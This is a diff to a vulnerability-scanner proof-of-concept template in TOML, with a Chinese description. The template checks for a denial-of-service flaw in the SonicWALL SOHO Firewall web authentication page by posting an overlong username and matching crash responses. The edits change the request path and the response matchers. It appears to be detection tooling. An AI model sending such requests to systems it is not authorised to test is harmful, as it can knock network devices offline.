@@ -1,6 +1,6 @@
 [info]
-author = "AVE"
-description = "通过向 SonicWALL SOHO 防火墙 4.0/5.0 的 Web 认证页面发送超长用户名字符串，触发输入验证缺陷导致 Web 服务进程崩溃，造成拒绝服务。发送包含超长 username 参数的 HTTP 请求至认证页面即可验证。"
+author = "ave"
+description = "向 SonicWALL SOHO Firewall 认证页面发送超长用户名，触发 Web 服务进程崩溃导致拒绝服务"
 id = "POC-AVE-2000-1082"
 name = "SonicWALL SOHO Firewall Web Server DoS PoC"
 severity = "medium"
@@ -15,7 +15,7 @@ logic = "all"
 
 [[poc.requests]]
 method = "POST"
-path = "/{{BaseURL}}/auth.html"
+path = "/{{BaseURL}}/auth"
 protocol = "http"
 
 [poc.requests.body]
@@ -28,18 +28,10 @@ User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
 expect = true
-status = [
-    500,
-    503,
-]
-type = "status"
-
-[[poc.requests.matchers]]
-expect = true
 part = "body"
 type = "word"
 words = [
     "Service Unavailable",
-    "Internal Server Error",
-    "connection refused",
+    "Connection refused",
+    "500",
 ]
